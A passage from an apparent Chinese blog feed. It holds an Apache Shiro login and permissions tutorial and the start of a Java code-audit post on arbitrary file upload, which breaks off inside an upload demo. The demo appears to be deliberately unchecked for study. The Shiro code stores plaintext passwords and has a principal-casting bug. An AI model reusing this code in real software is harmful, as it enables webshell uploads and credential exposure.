        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>我们只有在失败中寻找胜利，在绝望中寻求希望。</p><h2 id="0x01-shiro"><a href="#0x01-shiro" class="headerlink" title="0x01 shiro?"></a>0x01 shiro?</h2><p>Apache Shiro 是 Java 的一个安全框架，它可以非常容易的开发出足够好的应用，其不仅可以用在 JavaSE 环境，也可以用在 JavaEE 环境。Shiro 可以帮助我们完成：认证、授权、加密、会话管理、与 Web 集成、缓存等。这不就是我们想要的嘛，而且 Shiro 的 API 也是非常简单；其基本功能点如下图所示：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221013235423208.png"></p><ul><li><strong>Authentication</strong>：身份认证 / 登录，验证用户是不是拥有相应的身份；</li><li><strong>Authorization</strong>：授权，即权限验证，验证某个已认证的用户是否拥有某个权限；即判断用户是否能做事情，常见的如：验证某个用户是否拥有某个角色。或者细粒度的验证某个用户对某个资源是否具有某个权限；</li><li><strong>Session</strong> <strong>Management</strong>：会话管理，即用户登录后就是一次会话，在没有退出之前，它的所有信息都在会话中；会话可以是普通 JavaSE 环境的，也可以是如 Web 环境的；</li><li><strong>Cryptography</strong>：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储；</li><li><strong>Web Support</strong>：Web 支持，可以非常容易的集成到 Web 环境；</li><li><strong>Caching</strong>：缓存，比如用户登录后，其用户信息、拥有的角色 / 权限不必每次去查，这样可以提高效率；</li><li><strong>Concurrency</strong>：shiro 支持多线程应用的并发验证，即如在一个线程中开启另一个线程，能把权限自动传播过去；</li><li><strong>Testing</strong>：提供测试支持；</li><li><strong>Run As</strong>：允许一个用户假装为另一个用户（如果他们允许）的身份进行访问；</li><li><strong>Remember Me</strong>：记住我，这个是非常常见的功能，即一次登录后，下次再来的话不用登录了。</li></ul><h2 id="0x02-认证"><a href="#0x02-认证" class="headerlink" title="0x02 认证"></a>0x02 认证</h2><p><strong>认证</strong>：即在应用中谁能证明他就是他本人。一般提供如他们的身份 ID 一些标识信息来表明他就是他本人，如提供身份证，用户名 / 密码来证明。</p><p>1、这里我使用maven构建项目，首先先导入依赖</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.shiro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>shiro-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.shiro<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>shiro-spring<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jcl-over-slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.7.28<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-slf4j-impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.16.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.17.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、新建一个登录页面：login.html</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>登录页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${msg}<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name"><span class="token namespace">th:</span>action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>@{/toLogin}<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登录<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Controller层建立一个测试用例(com/root/controller/MyController.java)</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/toLogin"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">toLogin</span><span class="token punctuation">(</span>String username<span class="token punctuation">,</span>String password<span class="token punctuation">,</span>Model model<span class="token punctuation">)</span><span class="token punctuation">{</span>    Subject subject <span class="token operator">=</span> SecurityUtils<span class="token punctuation">.</span><span class="token function">getSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    UsernamePasswordToken userToken <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UsernamePasswordToken</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">{</span>        subject<span class="token punctuation">.</span><span class="token function">login</span><span class="token punctuation">(</span>userToken<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"/auth/main"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnknownAccountException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//用户名不存在</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span><span class="token string">"用户名错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IncorrectCredentialsException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//密码错误</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"msg"</span><span class="token punctuation">,</span><span class="token string">"密码错误"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>首先通过<code>SecurityUtils</code>获取subject和用户名/密码验证的token；</li><li>调用<code>subject.login</code>方法进行登录，其会自动委托给 <code>SecurityManager.login</code> 方法进行登录；</li><li>如果身份验证失败则捕获AuthenticationException或其子类，如UnknownAccountException（用户名错误）、IncorrectCredentialsException（密码错误）。</li></ul><p>简单概括下身份验证的步骤：</p><p>1)、用户从登录页面中输入username和password，进入toLogin方法；</p><p>2)、收集username和password进入subject.login方法中，如果身份验证成功，则跳转到<code>/auth/main</code>,如果验证失败，则返回login页面。</p><p>3、自定义Realm</p><p>Realm：域，<code>Shiro</code> 从 <code>Realm </code>获取安全数据（如用户、角色、权限），就是说 <code>SecurityManager</code> 要验证用户身份，那么它需要从 <code>Realm</code> 获取相应的用户进行比较以确定用户身份是否合法；也需要从 <code>Realm</code> 得到用户相应的角色 / 权限进行验证用户是否能进行操作；可以把 <code>Realm</code> 看成 <code>DataSource</code>，即安全数据源。</p><p>自定义Realm(com/root/config/UserRealm.java)</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserRealm</span> <span class="token keyword">extends</span> <span class="token class-name">AuthorizingRealm</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    UserServiceImpl userService<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> AuthenticationInfo <span class="token function">doGetAuthenticationInfo</span><span class="token punctuation">(</span>AuthenticationToken authenticationToken<span class="token punctuation">)</span> <span class="token keyword">throws</span> AuthenticationException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行->认证方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        UsernamePasswordToken Token <span class="token operator">=</span> <span class="token punctuation">(</span>UsernamePasswordToken<span class="token punctuation">)</span> authenticationToken<span class="token punctuation">;</span>        User user <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">queryUserByUsername</span><span class="token punctuation">(</span>Token<span class="token punctuation">.</span><span class="token function">getUsername</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">==</span> null<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> null<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">SimpleAuthenticationInfo</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span>user<span class="token punctuation">.</span><span class="token function">getPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>首先UsernamePasswordAuthenticationToken实现的带用户名和密码以及权限的Authentication，并赋值给Token；</li><li>当通过Token.getUsername()获取到的用户名在数据库中查不到相应的用户时，返回null；</li><li>然后传入从数据库中获取到的password，然后再与token中的password进行对比，匹配上了就通过，匹配不上就报异常。</li></ul><p>4、过滤器配置</p><p>Demo如下:（com/root/config/ShiroConfig.java）</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShiroConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> ShiroFilterFactoryBean <span class="token function">ShiroFilterFactoryBean</span><span class="token punctuation">(</span>SecurityManager securityManager<span class="token punctuation">)</span><span class="token punctuation">{</span>        ShiroFilterFactoryBean shiroFilterFactoryBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ShiroFilterFactoryBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        shiroFilterFactoryBean<span class="token punctuation">.</span><span class="token function">setSecurityManager</span><span class="token punctuation">(</span>securityManager<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">></span> maps <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        maps<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"/auth/*"</span><span class="token punctuation">,</span><span class="token string">"authc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//需要权限验证的接口</span>        shiroFilterFactoryBean<span class="token punctuation">.</span><span class="token function">setFilterChainDefinitionMap</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span><span class="token punctuation">;</span>        shiroFilterFactoryBean<span class="token punctuation">.</span><span class="token function">setLoginUrl</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//权限验证失败跳转到/login</span>        <span class="token keyword">return</span> shiroFilterFactoryBean<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> SecurityManager <span class="token function">DefaultWebSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        DefaultWebSecurityManager securityManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultWebSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        securityManager<span class="token punctuation">.</span><span class="token function">setRealm</span><span class="token punctuation">(</span><span class="token function">MyUserRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> securityManager<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> UserRealm <span class="token function">MyUserRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        UserRealm userRealm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> userRealm<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看效果如何？</p><p>输入错误的用户名时：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221014005901397.png"></p><p>输入错误的密码时：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221014005925430.png"></p><p>输入正确凭证时：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221014005956900.png"></p><h2 id="0x03-授权"><a href="#0x03-授权" class="headerlink" title="0x03 授权"></a>0x03 授权</h2><p><strong>授权</strong>：也叫访问控制，即在应用中控制谁能访问哪些资源（如访问页面/编辑数据/页面操作等）。在授权中需了解的几个关键对象：主体（Subject）、资源（Resource）、权限（Permission）、角色（Role）。</p><p>1、新建两个index1.html和index2.html，后面设置不同权限只能访问index1或者index2</p><p>2、在过滤器中设置访问不同的接口需要的权限：(com/root/config/ShiroConfig.java)</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ShiroConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> ShiroFilterFactoryBean <span class="token function">ShiroFilterFactoryBean</span><span class="token punctuation">(</span>SecurityManager securityManager<span class="token punctuation">)</span><span class="token punctuation">{</span>        ShiroFilterFactoryBean shiroFilterFactoryBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ShiroFilterFactoryBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        shiroFilterFactoryBean<span class="token punctuation">.</span><span class="token function">setSecurityManager</span><span class="token punctuation">(</span>securityManager<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span>String<span class="token operator">></span> maps <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        maps<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"/auth/index1"</span><span class="token punctuation">,</span><span class="token string">"perms[user:index1]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//访问/auth/index1需要账号具有user:index1的权限</span>        maps<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"/auth/index2"</span><span class="token punctuation">,</span><span class="token string">"perms[user:index2]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//访问/auth/index2需要账号具有user:index2的权限</span>        maps<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"/auth/*"</span><span class="token punctuation">,</span><span class="token string">"authc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        shiroFilterFactoryBean<span class="token punctuation">.</span><span class="token function">setFilterChainDefinitionMap</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span><span class="token punctuation">;</span>        shiroFilterFactoryBean<span class="token punctuation">.</span><span class="token function">setLoginUrl</span><span class="token punctuation">(</span><span class="token string">"/login"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> shiroFilterFactoryBean<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> SecurityManager <span class="token function">DefaultWebSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        DefaultWebSecurityManager securityManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultWebSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        securityManager<span class="token punctuation">.</span><span class="token function">setRealm</span><span class="token punctuation">(</span><span class="token function">MyUserRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> securityManager<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> UserRealm <span class="token function">MyUserRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        UserRealm userRealm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UserRealm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> userRealm<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Mysql的表设计如下：</p><p><img src="https://pingo78.oss-cn-hangzhou.aliyuncs.com/images/image-20221014015146559.png"></p><p>自定义Realm</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span>UserServiceImpl userService<span class="token punctuation">;</span><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> AuthorizationInfo <span class="token function">doGetAuthorizationInfo</span><span class="token punctuation">(</span>PrincipalCollection principalCollection<span class="token punctuation">)</span> <span class="token punctuation">{</span>    SimpleAuthorizationInfo Info <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleAuthorizationInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Subject subject <span class="token operator">=</span> SecurityUtils<span class="token punctuation">.</span><span class="token function">getSubject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    User principal <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span> subject<span class="token punctuation">.</span><span class="token function">getPrincipal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//拿到user对象</span>    Info<span class="token punctuation">.</span><span class="token function">addStringPermission</span><span class="token punctuation">(</span>principal<span class="token punctuation">.</span><span class="token function">getPerms</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置当前用户的权限</span>    <span class="token keyword">return</span> Info<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java代码审计之任意文件上传</title>
      <link href="/2022/10/12/java-dai-ma-shen-ji-zhi-ren-yi-wen-jian-shang-chuan/"/>
      <url>/2022/10/12/java-dai-ma-shen-ji-zhi-ren-yi-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Time and tide wait for no man.</p><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>任意文件上传漏洞的本质是在进行文件上传操作时未对文件类型进行检测或者检测功能不规范导致被绕过，从而使攻击者上传的可执行脚本(WEBSHELL)被上传至服务器并成功解析。</p><h2 id="0x02-java常见文件上传方式"><a href="#0x02-java常见文件上传方式" class="headerlink" title="0x02 java常见文件上传方式"></a>0x02 java常见文件上传方式</h2><p>在java开发中，文件上传的方式有多种，我们主要讲下以下三种最为常用的。</p><ul><li>通过文件流的方式</li><li>通过ServletFileUpload</li><li>通过MultipartFile</li></ul><p>我们逐步对这三种方式起个Demo，来加深了解它们上传的方式是怎么样的。</p><h3 id="1、MultipartFile"><a href="#1、MultipartFile" class="headerlink" title="1、MultipartFile"></a>1、MultipartFile</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/upload"</span><span class="token punctuation">)</span><span class="token keyword">public</span> String <span class="token function">upload</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"file"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> MultipartFile file<span class="token punctuation">,</span>HttpServletRequest request<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    String fileName <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getOriginalFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token 